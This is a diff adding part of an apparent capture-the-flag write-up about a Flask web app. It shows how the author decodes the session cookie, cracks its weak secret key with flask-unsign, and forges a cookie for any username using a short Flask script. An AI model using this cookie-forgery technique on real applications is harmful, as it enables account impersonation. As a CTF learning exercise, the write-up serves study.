@@ -123,3 +123,18 @@ _______________________________________________
 <br> The first step we must do is figuring out where and how the app is setting the username. burpsuit it is !
 <br> This application is using a session cookie as seen in the photo. and we get it right by decrypting it with base 64 !
 <br>![image](https://user-images.githubusercontent.com/61564815/103544425-63247680-4ea0-11eb-9dd3-f8d165829922.png)
+<br> Now we know that we have to messup with this session cookie ! but we are sure that since it is a flask app again. we have to crack the secret key by using ```Flask-unsign -c -u <token> ``` command. and the secret key is "secret-key-goes-here" lol . 
+<br> now that we have the secret key , one of the ideas to create a new token is to create a flask application with the same secret key and set the user string the way we like.
+<br> example of a python code :
+<br> ``` py
+from flask import Flask, session, redirect
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'secret-key-goes-here'
+@app.route('/')
+def index():
+    session['user'] = "put your username here"
+    return session.get('user')
+
+app.run(host='127.0.0.1', port=8000) ``` 
+<br> run this flask app and get the needed token !
+
